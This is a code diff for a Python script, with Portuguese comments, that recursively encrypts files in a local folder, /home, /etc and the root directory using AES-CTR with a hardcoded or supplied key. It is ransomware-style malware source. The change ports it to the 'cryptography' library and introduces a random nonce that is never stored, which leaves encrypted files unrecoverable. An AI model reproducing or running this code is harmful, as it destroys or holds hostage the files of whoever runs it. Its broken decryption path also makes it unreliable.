@@ -1,14 +1,9 @@
-#! /usr/bin/python3.10
-# -*- coding: utf-8 -*-
+import os
+import argparse
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
 import Crypter
 import Discovery
-import secrets
-import sys
-from Crypto.Cipher import AES
-from Crypto.Util import Counter
-import argparse
-import os
-
 
 # --------------
 # A senha pode ter os seguintes tamanhos
@@ -38,11 +33,13 @@ def main():
     else:
         if HARDCODED_KEY:
             key = HARDCODED_KEY
-    ctr = Counter.new(nbits=128, initial_value=0)
-    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
+
+    nonce = os.urandom(16)
+    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce[:16]))
+    crypt = cipher.encryptor()
 
     if not decrypt:
-        cryptFn = crypt.encrypt
+        cryptFn = crypt.update
 
         init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
         startDirs = [init_path, '/home', '/etc', '/']
@@ -66,7 +63,7 @@ def main():
         startDirs = [init_path, '/home', '/etc', '/']
 
         for currentDir in startDirs:
-            for filename in Discovery.discover(currentDir):
+            for filename in Discovery.discovery(currentDir):
                 Crypter.change_files(filename, cryptFn)
 
         # limpa a chave de criptografia da memória
@@ -76,4 +73,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
